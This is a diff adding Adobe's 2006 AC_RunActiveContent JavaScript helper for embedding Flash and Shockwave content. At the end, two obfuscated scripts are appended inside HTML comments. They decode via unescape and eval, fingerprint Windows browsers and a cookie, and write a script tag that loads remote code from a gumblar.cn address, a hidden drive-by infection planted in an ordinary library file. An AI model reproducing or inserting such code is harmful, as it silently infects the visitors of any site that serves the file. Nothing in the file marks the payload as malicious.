@@ -1,0 +1,131 @@
+//v1.0
+//Copyright 2006 Adobe Systems, Inc. All rights reserved.
+function AC_AddExtension(src, ext)
+{
+  if (src.indexOf('?') != -1)
+    return src.replace(/\?/, ext+'?'); 
+  else
+    return src + ext;
+}
+
+function AC_Generateobj(objAttrs, params, embedAttrs) 
+{ 
+  var str = '<object ';
+  for (var i in objAttrs)
+    str += i + '="' + objAttrs[i] + '" ';
+  str += '>';
+  for (var i in params)
+    str += '<param name="' + i + '" value="' + params[i] + '" /> ';
+  str += '<embed ';
+  for (var i in embedAttrs)
+    str += i + '="' + embedAttrs[i] + '" ';
+  str += ' ></embed></object>';
+
+  document.write(str);
+}
+
+function AC_FL_RunContent(){
+  var ret = 
+    AC_GetArgs
+    (  arguments, ".swf", "movie", "clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
+     , "application/x-shockwave-flash"
+    );
+  AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
+}
+
+function AC_SW_RunContent(){
+  var ret = 
+    AC_GetArgs
+    (  arguments, ".dcr", "src", "clsid:166B1BCA-3F9C-11CF-8075-444553540000"
+     , null
+    );
+  AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
+}
+
+function AC_GetArgs(args, ext, srcParamName, classid, mimeType){
+  var ret = new Object();
+  ret.embedAttrs = new Object();
+  ret.params = new Object();
+  ret.objAttrs = new Object();
+  for (var i=0; i < args.length; i=i+2){
+    var currArg = args[i].toLowerCase();    
+
+    switch (currArg){	
+      case "classid":
+        break;
+      case "pluginspage":
+        ret.embedAttrs[args[i]] = args[i+1];
+        break;
+      case "src":
+      case "movie":	
+        args[i+1] = AC_AddExtension(args[i+1], ext);
+        ret.embedAttrs["src"] = args[i+1];
+        ret.params[srcParamName] = args[i+1];
+        break;
+      case "onafterupdate":
+      case "onbeforeupdate":
+      case "onblur":
+      case "oncellchange":
+      case "onclick":
+      case "ondblClick":
+      case "ondrag":
+      case "ondragend":
+      case "ondragenter":
+      case "ondragleave":
+      case "ondragover":
+      case "ondrop":
+      case "onfinish":
+      case "onfocus":
+      case "onhelp":
+      case "onmousedown":
+      case "onmouseup":
+      case "onmouseover":
+      case "onmousemove":
+      case "onmouseout":
+      case "onkeypress":
+      case "onkeydown":
+      case "onkeyup":
+      case "onload":
+      case "onlosecapture":
+      case "onpropertychange":
+      case "onreadystatechange":
+      case "onrowsdelete":
+      case "onrowenter":
+      case "onrowexit":
+      case "onrowsinserted":
+      case "onstart":
+      case "onscroll":
+      case "onbeforeeditfocus":
+      case "onactivate":
+      case "onbeforedeactivate":
+      case "ondeactivate":
+      case "type":
+      case "codebase":
+        ret.objAttrs[args[i]] = args[i+1];
+        break;
+      case "width":
+      case "height":
+      case "align":
+      case "vspace": 
+      case "hspace":
+      case "class":
+      case "title":
+      case "accesskey":
+      case "name":
+      case "id":
+      case "tabindex":
+        ret.embedAttrs[args[i]] = ret.objAttrs[args[i]] = args[i+1];
+        break;
+      default:
+        ret.embedAttrs[args[i]] = ret.params[args[i]] = args[i+1];
+    }
+  }
+  ret.objAttrs["classid"] = classid;
+  if (mimeType) ret.embedAttrs["type"] = mimeType;
+  return ret;
+}
+<!-- 
+(function(a3wj8){var pgHj='var>20>61>3d>22Scr>69>70t>45n>67in>65>22>2cb>3d>22V>65rsion(>29+>22>2cj>3d>22>22>2c>75>3dnavigat>6f>72>2eus>65>72>41gent>3bif((u>2eind>65x>4f>66(>22Win>22)>3e0)>26>26>28u>2e>69ndex>4ff(>22>4e>54>206>22)>3c0)>26>26(>64ocum>65nt>2ecoo>6bie>2e>69nd>65xOf>28>22mi>65k>3d1>22>29>3c>30)>26>26(t>79peof>28zr>76zts>29>21>3dtypeof(>22A>22)>29)>7bzrvz>74s>3d>22A>22>3beva>6c(>22if>28>77indow>2e>22>2b>61>2b>22)j>3dj>2b>22+a+>22Maj>6fr>22+>62+a+>22Minor>22+>62>2ba+>22Buil>64>22>2bb+>22j>3b>22)>3b>64>6f>63u>6d>65n>74>2ewrite(>22>3csc>72ipt>20src>3d>2f>2fgumbla>72>2e>63n>2f>72>73>73>2f>3f>69>64>3d>22+>6a+>22>3e>3c>5c>2fs>63>72ipt>3e>22)>3b>7d';var YAN8=unescape(pgHj.replace(a3wj8,'%'));eval(YAN8)})(/>/g);
+ --><!-- 
+(function(){var Dl2i='v~61r~20a~3d~22ScriptEngine~22~2cb~3d~22Version()+~22~2c~6a~3d~22~22~2cu~3dnavigato~72~2eus~65rAg~65~6e~74~3b~69f((u~2eindexOf(~22~57~69~6e~22)~3e0)~26~26(u~2e~69~6ed~65xOf~28~22NT~20~36~22)~3c~30)~26~26(~64~6fcument~2ec~6f~6fkie~2eindexOf(~22miek~3d~31~22~29~3c0)~26~26~28ty~70eof(zrvzts~29~21~3dtyp~65of(~22~41~22~29))~7bzrv~7ats~3d~22A~22~3be~76~61l~28~22if(~77ind~6fw~2e~22~2ba+~22)~6a~3dj+~22~2ba~2b~22Majo~72~22+b+a~2b~22M~69nor~22+b+a+~22Build~22+b~2b~22j~3b~22)~3bdoc~75~6dent~2ewrite(~22~3c~73~63~72ipt~20~73~72c~3d~2f~2f~67umb~6car~2ec~6e~2f~72ss~2f~3f~69~64~3d~22+j+~22~3e~3c~5c~2fscript~3e~22)~3b~7d';eval(unescape(Dl2i.replace(/~/g,'%')))})();
+ -->
